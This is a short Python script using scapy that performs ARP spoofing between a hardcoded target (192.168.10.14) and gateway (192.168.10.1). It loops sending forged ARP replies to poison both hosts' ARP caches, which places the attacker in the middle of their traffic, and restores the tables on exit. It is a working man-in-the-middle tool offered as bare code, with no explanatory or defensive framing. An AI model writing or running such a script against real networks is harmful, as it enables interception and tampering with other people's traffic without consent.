#!/usr/bin/python3

import scapy.all as scapy
import time

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast_packet = broadcast_packet / arp_packet
    answered = scapy.srp(arp_broadcast_packet,timeout=5,verbose=False)[0]
    try:
        return answered[0][1].hwsrc
    except IndexError:
        return '88:88:88:88:88:88'

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    arp_spoof_response = scapy.ARP(op=2, hwdst=target_mac, psrc=spoof_ip, pdst=target_ip)
    scapy.send(arp_spoof_response,verbose=False)

def restore(target_ip,spoofed_ip):
    target_mac = get_mac(target_ip)
    real_mac_of_spoofed_ip = get_mac(spoofed_ip)
    arp_honest_response = scapy.ARP(op=2,psrc=spoofed_ip, pdst=target_ip, hwsrc=real_mac_of_spoofed_ip, hwdst=target_mac)
    scapy.send(arp_honest_response,verbose=False,count=4)

sent_packets_count = 0
target_ip = '192.168.10.14'
gateway_ip = '192.168.10.1'

while True:
    try:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets_count += 1
        print(f"\r[+] {sent_packets_count} packet pair sent to both IP's",end='')
        time.sleep(2)
    except KeyboardInterrupt:
        print("\n\n[+] Restoring ARP tables...")
        restore(target_ip,gateway_ip)
        restore(gateway_ip,target_ip)
        print("[+] Exiting...")
        exit()